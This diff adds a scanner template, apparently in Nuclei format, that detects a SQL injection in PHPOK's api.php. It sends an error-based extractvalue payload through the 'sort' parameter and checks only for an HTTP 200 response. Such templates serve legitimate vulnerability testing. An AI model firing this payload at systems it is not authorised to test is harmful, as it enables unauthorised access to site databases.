@@ -1,0 +1,21 @@
+id: poc-yaml-phpok-sqli
+
+info:
+  name: poc-yaml-phpok-sqli
+  author: jinqi
+  severity: high
+  tags: xray-converted,sqli,ct-158158
+  reference:
+    - https://github.com/jinqi520
+
+http:
+  - raw:
+      - |
+        GET /api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5({{rand_int(1000, 9999)}}))) --+ HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
